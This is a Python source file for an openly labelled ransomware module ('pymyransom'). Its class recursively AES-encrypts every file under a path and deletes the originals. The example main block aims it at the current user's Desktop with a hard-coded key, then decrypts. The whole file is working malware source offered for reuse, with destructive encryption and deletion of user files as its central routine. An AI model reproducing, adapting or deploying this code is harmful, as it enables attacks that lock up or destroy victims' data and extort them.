import glob
import os, random, struct
import getpass
from Cryptodome.Cipher import AES

class makeMyRansomware:
    def __init__(self, your_extension=".Example", key=b'keyfor16bytes123', username=getpass.getuser()):
        '''Usage : ransomware_name = makeMyRansomware(".YourExtension")
        Thank you for using pymyransom!
        This ransomware module encrypts or decrypts files with AES.
        This module requires glob, os, random, struct, getpass, Cryptodomex.'''
        self.your_extension = your_extension
        self.key = key
        self.username = username

    def encrypt_file(self, key, in_filename, out_filename=None, chunksize=64*1024):
        """ Encrypts a file using AES (CBC mode) with the
            given key.
            key:
                The encryption key - a string that must be
                either 16, 24 or 32 bytes long. Longer keys
                are more secure.
            in_filename:
                Name of the input file
            out_filename:
                If None, '<in_filename>.yourExtension' will be used.
            chunksize:
                Sets the size of the chunk which the function
                uses to read and encrypt the file. Larger chunk
                sizes can be faster for some files and machines.
                chunksize must be divisible by 16.
        """
        if not out_filename:
            out_filename = in_filename + self.your_extension

        iv = os.urandom(16) 
        encryptor = AES.new(key ,AES.MODE_CBC, iv)
        filesize = os.path.getsize(in_filename)

        with open(in_filename, 'rb') as infile:
            with open(out_filename, 'wb') as outfile:
                outfile.write(struct.pack('<Q', filesize))
                outfile.write(iv)

                while True:
                    chunk = infile.read(chunksize)
                    if len(chunk) == 0:
                        break
                    elif len(chunk) % 16 != 0:
                        chunk += b' ' * (16 - len(chunk) % 16)

                    outfile.write(encryptor.encrypt(chunk))

    def decrypt_file(self, key, in_filename, out_filename=None, chunksize=24*1024):
        """ Decrypts a file using AES (CBC mode) with the
            given key. Parameters are similar to encrypt_file,
            with one difference: out_filename, if not supplied
            will be in_filename without its last extension
            (i.e. if in_filename is 'aaa.zip.yourExtension' then
            out_filename will be 'aaa.zip')
        """
        if not out_filename:
            out_filename = os.path.splitext(in_filename)[0]

        with open(in_filename, 'rb') as infile:
            origsize = struct.unpack('<Q', infile.read(struct.calcsize('Q')))[0]
            iv = infile.read(16)
            decryptor = AES.new(key, AES.MODE_CBC, iv)

            with open(out_filename, 'wb') as outfile:
                while True:
                    chunk = infile.read(chunksize)
                    if len(chunk) == 0:
                        break
                    outfile.write(decryptor.decrypt(chunk))

                outfile.truncate(origsize)


    def Encryptor(self, startPath):
        '''Encrypts all your files in startPath.'''
        for filename in glob.iglob(startPath, recursive=True):
            if(os.path.isfile(filename)):
                print('Encrypting> ' + filename)
                self.encrypt_file(self.key, filename)
                os.remove(filename)
    
    def Decryptor(self, startPath):
        '''Decrypts all your files in startPath.'''
        for filename in glob.iglob(startPath, recursive=True):
            if(os.path.isfile(filename)):
                fname, ext = os.path.splitext(filename)
                if (ext == self.your_extension):
                    print('Decrypting> ' + filename)
                    self.decrypt_file(self.key, filename)
                    os.remove(filename)

if __name__ == "__main__":
    import time
    Ransom1 = makeMyRansomware(".Hello")
    startpath = 'c:/Users/'+Ransom1.username+'/Desktop/**'
    #You can encrypt or decrypt like this
    Ransom1.Encryptor(startpath)
    Ransom1.Decryptor(startpath)

